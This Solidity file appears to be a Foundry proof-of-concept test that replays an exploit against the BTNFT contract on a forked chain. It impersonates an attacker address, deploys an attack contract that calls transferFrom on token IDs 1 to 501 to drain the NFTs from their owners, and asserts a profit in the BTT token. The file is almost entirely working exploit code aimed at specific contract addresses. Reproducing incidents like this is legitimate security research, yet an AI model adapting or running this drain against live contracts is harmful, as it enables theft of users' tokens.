
pragma solidity ^0.8.20;

import {Base, IERC721Like} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 48472355;
    uint256 constant TX_TIMESTAMP = 1744999252;
    uint256 constant TX_BLOCK_NUMBER = 48472356;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(address(attack), address(0));
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.BTT, "BTT", 19158433044140030441194);
    }
}

contract OurAttack {
    uint256 internal constant FIRST_TOKEN_ID = 1;
    uint256 internal constant LAST_TOKEN_ID = 501;

    function attack() external payable {
        drainBtnftNfts();
    }

    function drainBtnftNfts() internal {
        IERC721Like collateralNft = IERC721Like(Addresses.BTNFT);


        for (uint256 tokenId = FIRST_TOKEN_ID; tokenId <= LAST_TOKEN_ID; tokenId++) {
            address tokenOwner = collateralNft.ownerOf(tokenId);
            collateralNft.transferFrom(tokenOwner, Addresses.BTNFT, tokenId);
        }
    }

    receive() external payable {}

    function test(address targetPool, address profitToken, uint256 tokenCount) external payable {
        targetPool;
        profitToken;
        tokenCount;
        drainBtnftNfts();
    }

    fallback() external payable {}
}

library Addresses {
    address internal constant BTNFT = 0x0FC91B6Fea2E7A827a8C99C91101ed36c638521B;
    address internal constant BTT = 0xDAd4df3eFdb945358a3eF77B939Ba83DAe401DA8;
    address internal constant attack_contract = 0x7A4D144307d2DFA2885887368E4cd4678dB3c27a;
    address internal constant attacker_eoa = 0xBdA2a27CDb2FFd4258f3B1ed664ED0f28f9e0fC3;
}
